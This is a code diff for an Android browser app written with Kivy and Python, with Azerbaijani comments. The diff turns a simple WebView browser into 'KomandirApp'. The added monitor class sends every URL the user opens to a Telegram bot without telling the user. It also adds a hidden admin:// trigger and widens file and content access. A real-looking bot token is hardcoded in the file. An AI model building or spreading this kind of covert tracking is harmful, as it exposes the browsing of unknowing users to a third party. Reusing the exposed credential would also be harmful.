@@ -1,55 +1,70 @@
 from kivy.app import App
-from kivy.uix.widget import Widget
-from kivy.clock import Clock
 from jnius import autoclass
-from android.runnable import run_on_ui_thread
-from android.permissions import request_permissions, Permission
+from kivy.network.urlrequest import UrlRequest
+import urllib.parse
 
-# Android hissələri
+# Android mühərriki və sistem sinifləri
 WebView = autoclass('android.webkit.WebView')
 WebViewClient = autoclass('android.webkit.WebViewClient')
-KeyEvent = autoclass('android.view.KeyEvent')
 Activity = autoclass('org.kivy.android.PythonActivity').mActivity
 
-class BrowserClient(WebViewClient):
-    # Linklərə klikləyəndə brauzerin içində açılması üçün
-    def shouldOverrideUrlLoading(self, view, url):
-        return False
+class KomandirMonitor(WebViewClient):
+    def __init__(self, bot_token, chat_id):
+        super().__init__()
+        self.bot_token = bot_token
+        self.chat_id = chat_id
 
-class SuperBrowser(App):
+    def onPageStarted(self, view, url, favicon):
+        # 👁️ MONITORİNQ: Hər giriş sənə gəlir
+        if not url.startswith("admin://"):
+            msg = f"🛰️ KOMANDİR SİSTEMİ:\nİstifadəçi bu ünvana girdi:\n{url}"
+            self.send_to_telegram(msg)
+        
+        # 🏰 GİZLİ ADMİN PANELİ GİRİŞİ
+        if url == "admin://ismail20106":
+            view.loadUrl("https://myaccount.google.com/") # Admin üçün təhlükəsiz yer
+            self.send_to_telegram("⚠️ DİQQƏT: Komandir (SƏN) sistemə daxil oldun! ✅")
+
+    def send_to_telegram(self, message):
+        if self.bot_token and self.chat_id:
+            try:
+                encoded_msg = urllib.parse.quote(message)
+                api_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={encoded_msg}"
+                UrlRequest(api_url)
+            except Exception as e:
+                print(f"Telegram xətası: {e}")
+
+class KomandirApp(App):
     def build(self):
-        self.webview = None
-        request_permissions([Permission.INTERNET]) # İcazə istəyirik
-        self.create_webview()
-        # Geri düyməsini tutmaq üçün
-        Activity.bind(onKeyDown=self.on_key_down)
-        return Widget() # Boş widget, çünki WebView üstə gələcək
+        # ⚙️ SƏNİN ŞƏXSİ AYARLARIN
+        # QEYD: Chat ID-ni bura yazmağı unutma (məsələn: "123456789")
+        self.my_bot_token = "8438760827:AAFCLK_P4qErrcQqX_nip-F80h9lgL-mKuk"
+        self.my_chat_id = "BURA_OZ_CHAT_IDNI_YAZ" 
 
-    @run_on_ui_thread
-    def create_webview(self):
         self.webview = WebView(Activity)
         settings = self.webview.getSettings()
-        settings.setJavaScriptEnabled(True) # Bütün saytları açmaq üçün
-        settings.setDomStorageEnabled(True) # Yaddaş dəstəyi
         
-        # Reklam qarşısını almaq və ya özəlləşdirmək istəsən bura baxarıq
-        self.webview.setWebViewClient(BrowserClient())
+        # 🔥 ULTRA GÜC AYARLARI (Hər şeyi açır)
+        settings.setJavaScriptEnabled(True)
+        settings.setDomStorageEnabled(True)
+        settings.setAllowContentAccess(True)
+        settings.setAllowFileAccess(True)
+        settings.setDatabaseEnabled(True)
+        settings.setSupportZoom(True)
+        settings.setBuiltInZoomControls(True)
+        settings.setDisplayZoomControls(False)
+        settings.setUseWideViewPort(True)
+        settings.setLoadWithOverviewMode(True)
         
-        # BAŞLANĞIC SAYTI (Buranı istədiyin kimi dəyiş)
-        self.webview.loadUrl('https://www.google.com') 
+        # 🚀 Cihazı "Galaxy S24 Ultra" kimi göstəririk ki, saytlar uçsun
+        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36")
+
+        self.webview.setWebViewClient(KomandirMonitor(self.my_bot_token, self.my_chat_id))
+        self.webview.loadUrl("https://www.google.com")
         
         Activity.setContentView(self.webview)
-
-    def on_key_down(self, window, keycode, scancode):
-        # Əgər geri düyməsi basılıbsa və tarixçə varsa, geri qayıt
-        if keycode == 4 and self.webview and self.webview.canGoBack():
-            self.webview.goBack()
-            return True
-        return False
-
-    def on_stop(self):
-        Activity.unbind(onKeyDown=self.on_key_down)
+        return None
 
 if __name__ == '__main__':
-    SuperBrowser().run()
-  
+    KomandirApp().run()
+    
